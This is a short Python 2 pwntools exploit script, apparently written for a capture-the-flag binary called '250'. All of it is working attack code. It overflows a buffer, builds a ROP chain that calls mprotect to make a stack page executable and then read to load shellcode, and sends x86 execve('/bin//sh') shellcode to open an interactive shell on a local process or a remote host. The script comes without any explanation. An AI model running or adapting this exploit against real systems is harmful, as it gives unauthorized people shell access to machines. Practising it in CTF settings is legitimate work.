#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *

# switches

if len(sys.argv) == 1:
	DEBUG = 1 
else :
	DEBUG = 0
# modify this
if DEBUG:
    io = process('./250')
	#gdb.attach(io,'#b main')
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

context(log_level='debug')

# define symbols and offsets here

mprotect = 0x0806E070
main_addr = 0x08048886
read = 0x0806D510
stack = 0x08049000
size = 0x1000
prop = 7

# define exploit function here
def pwn():
	io.recvuntil('[InPut Data Size]')
	io.sendline('82')
	io.recvuntil('[YourData]')
	payload1 = 'A' * 62+p32(mprotect)+p32(main_addr)+p32(stack)+p32(size)+p32(prop)	
	io.send(payload1)
	io.recvuntil('[InPut Data Size]')
	io.sendline('90')
	io.recvuntil('[YourData]')
	shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
	ssize = len(shellcode)
	payload2 = 'A' * 62+p32(read)+p32(stack)+p32(0)+p32(stack)+p32(ssize)+'THE END!'
	io.send(payload2)
	#io.recvuntil('THE END!')
	raw_input('send?')
	io.send(shellcode)
	io.interactive()
	return

if __name__ == '__main__':
    pwn()
